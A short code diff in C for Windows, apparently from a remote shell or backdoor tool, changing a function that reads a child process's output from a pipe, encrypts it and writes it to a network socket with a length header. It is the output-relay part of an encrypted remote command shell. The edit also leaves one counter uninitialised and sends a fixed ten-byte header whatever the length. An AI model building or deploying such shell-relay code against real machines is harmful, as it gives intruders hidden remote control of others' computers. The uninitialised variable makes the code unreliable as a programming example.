@@ -108,18 +108,27 @@ DWORD WINAPI shellPipe(LPVOID lPparam) {
 }
 
 void sendPipe() { //FUNC TO WRITE TO SOCKET HANDLE
-	DWORD dwRead, dwWritten;
-	DWORD bytesavail = 0;
+	DWORD bytesavail, dwWritten, dwRead = 0;
 	char buff[MAX_READ];
 	ZeroMemory(buff, sizeof(buff));
 	BOOL bSuccess = FALSE;
 	char encrypted[DEFAULT_BUFLEN];
 	for (;;) {
 		PeekNamedPipe(ChildStd_OUT_Rd, NULL, 0, NULL, &bytesavail, 0);
-		if (bytesavail) {
+		if (bytesavail) { 
+			//read data from child handle
 			bSuccess = ReadFile(ChildStd_OUT_Rd, buff, MAX_READ, &dwRead, NULL);
 			if (!bSuccess || dwRead == 0) break; //no data read or read failed
+			
+												 //encrypt data
 			int bytesencrypt = encrypt(buff, dwRead, encrypted); //encrypt data
+			
+			char sizechar[10];
+			ZeroMemory(sizechar, sizeof(sizechar));
+			int written = sprintf(sizechar, "%d", bytesencrypt); //notifys how mnay bytes are being sent
+			send(sockt, sizechar, sizeof(sizechar), 0);
+
+			//send actual data
 			bSuccess = WriteFile((HANDLE)sockt, encrypted, bytesencrypt, &dwWritten, NULL);
 		}
 		else break;
